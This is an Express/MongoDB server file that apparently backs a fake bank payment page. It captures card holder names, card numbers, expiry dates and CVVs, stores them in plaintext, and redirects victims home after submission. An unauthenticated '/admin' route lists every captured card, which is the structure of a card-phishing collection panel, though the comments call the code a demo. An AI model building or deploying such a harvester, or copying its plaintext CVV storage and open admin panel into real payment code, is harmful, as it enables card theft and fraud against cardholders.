require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const path = require('path');
const Card = require('./models/Card');

const app = express();
const PORT = process.env.PORT || 3000;

// Connect to MongoDB
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/bankApp')
    .then(() => console.log('Connected to MongoDB'))
    .catch(err => console.error('Could not connect to MongoDB', err));

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.set('view engine', 'ejs');

// Routes

// 1. Payment Page (Home)
app.get('/', (req, res) => {
    res.render('index');
});

// 2. Submit Form
app.post('/submit', async (req, res) => {
    try {
        const { cardHolderName, cardNumber, expiryDate, cvv } = req.body;

        const newCard = new Card({
            cardHolderName,
            cardNumber,
            expiryDate,
            cvv
        });
        await newCard.save();

        // In a real app, you might redirect to an OTP page or success page.
        // For this demo, we'll just redirect back or show a success message.
        // Let's redirect to home for now to "simulate" a reload or simple success.
        res.redirect('/');
    } catch (err) {
        console.error(err);
        const fs = require('fs');
        fs.appendFileSync('server_error.log', err.toString() + '\n' + err.stack + '\n');
        res.status(500).send("Error saving data");
    }
});

// 3. Admin Panel
app.get('/admin', async (req, res) => {
    try {
        const cards = await Card.find().sort({ createdAt: -1 });
        res.render('admin', { cards });
    } catch (err) {
        console.error(err);
        res.status(500).send("Error retrieving data");
    }
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
